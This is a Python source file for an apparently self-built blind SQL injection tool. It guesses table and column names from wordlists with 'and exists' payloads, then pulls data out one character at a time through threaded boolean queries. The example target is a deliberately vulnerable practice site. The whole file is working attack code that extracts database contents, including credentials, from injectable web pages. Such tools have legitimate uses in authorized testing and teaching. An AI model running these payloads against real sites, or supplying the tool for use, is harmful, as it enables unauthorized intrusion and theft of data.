import re, requests, threading, sys, os
from prettytable import PrettyTable
sys.path.append(os.getcwd())
from src.logger.log import logger


__author__ = "AdminTony"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
}
table_list = []
column_list = []
data_dir = {}


def Generator_table():
    for table_name in open(os.getcwd() + "/data/txt/tables.txt", "r+"):
        if table_name != "":
            yield table_name.split('\n')[0]
    return


def Generator_column():
    for column_name in open(os.getcwd() + "/data/txt/columns.txt", "r+"):
        if column_name != "":
            yield column_name.split('\n')[0]
    return


tablegen = Generator_table()
columngen = Generator_column()


def test_tables(url_, keyword):
    while True:
        try:
            table_name = tablegen.__next__()
        except StopIteration:
            break
        except KeyboardInterrupt:
            break

        payload = "and exists (select * from " + table_name + ")"
        url = url_
        if '*' in url:
            url = url.replace('*', payload)
        else:
            url = url + payload

        res = requests.get(url, headers=headers)

        if keyword in res.text:
            logger.info("[+] Exit table : %s" % table_name)
            global table_list
            table_list.append(table_name)
        else:
            logger.info("[-] Testing table : %s" % table_name)


def test_columns(url_, table_name, keyword):
    while True:
        try:
            column_name = columngen.__next__()
        except StopIteration:
            break

        payload = "and exists (select " + column_name + " from " + table_name + ")"
        url = url_

        if '*' in url:
            url = url.replace('*', payload)
        else:
            url = url + payload

        res = requests.get(url, headers=headers)

        if keyword in res.text:
            logger.info("[+] Exit column : %s" % column_name)
            global column_list
            column_list.append(column_name)
        else:
            logger.info("[-] Testing column : %s" % column_name)


class Dump(object):
    def __init__(self, url, table_name, column_name, keyword):
        self.url = url
        self.char_list = [i for i in range(32, 128)]
        self.table_name = table_name
        self.column_name = column_name
        self.keyword = keyword

    def len_data(self):
        n = 0
        while True:
            payload = "and (select top 1 len(%s) from %s)=%s" % (self.column_name, self.table_name, n)
            url = self.url

            if '*' in url:
                url = url.replace('*', payload)
            else:
                url = url + payload

            res = requests.get(url, headers=headers)

            if self.keyword in res.text:
                break
            n += 1
        return n

    def dump_data(self):
        data = ""
        length = self.len_data()
        logger.info("[+] The Length of %s is %s !" % (self.column_name, length))
        logger.info("[+] Dump data please waiting !")
        for i in range(1, length + 1):
            j = 0
            while True:
                try:
                    char = self.char_list[j]
                except IndexError:
                    break

                payload = "and (select top 1 asc(mid(%s,%s,1)) from %s) =%s" % (
                    self.column_name, i, self.table_name, char)
                url = self.url

                if '*' in url:
                    url = url.replace('*', payload)
                else:
                    url = url + payload

                try:
                    logger.info(url)
                    res = requests.get(url, headers=headers, timeout=10)
                    if self.keyword in res.text:
                        data = data + chr(char)
                        break
                    j += 1
                except requests.RequestException:
                    pass

        global data_dir
        data_dir[self.column_name] = data


def run_col(url, table, column, keyword):
    dump = Dump(url, table, column, keyword)
    dump.dump_data()


def sql_injection(url, keyword=None, thread_num=10):
    global table_list, column_list, data_dir
    table_list = []
    column_list = []
    data_dir = {}

    threads = []
    for i in range(thread_num):
        thread = threading.Thread(target=test_tables, args=(url, keyword))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

    logger.info("\n[+] Table_name : ")
    table_set = set(table_list)
    for table in table_set:
        logger.info("[+] %s" % table)

    pretty_table = PrettyTable()
    pretty_table.field_names = ["Table Name", "Column Name", "Data"]

    for table_name in table_set:
        threads = []
        for i in range(thread_num):
            thread = threading.Thread(target=test_columns, args=(url, table_name, keyword))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

        logger.info("\n[+] Column Name for Table %s: " % table_name)
        column_set = set(column_list)
        for col in column_set:
            logger.info("[+] %s" % col)

        if column_set:
            logger.info("\n[+] Dumping data for Table %s: " % table_name)
            threads = []
            for col in column_set:
                thread = threading.Thread(target=run_col, args=(url, table_name, col, keyword))
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()

            logger.info("[+] Table : %s " % table_name)
            sys.stdout.write("    [+]Column : ")
            for col in column_set:
                sys.stdout.write(col + "|")
            sys.stdout.write("\n        [+]data : ")
            for col in column_set:
                sys.stdout.write(data_dir[col] + "|")

            pretty_table.add_row([table_name, "|".join(column_set), "|".join(data_dir[col] for col in column_set)])

    logger.info("\n[+] Pretty Table Dump:")
    logger.info(pretty_table)


if __name__ == "__main__":
    sql_injection(url="https://hack-yourself-first.com/Make/5?orderby=supercarid)", keyword="Application")
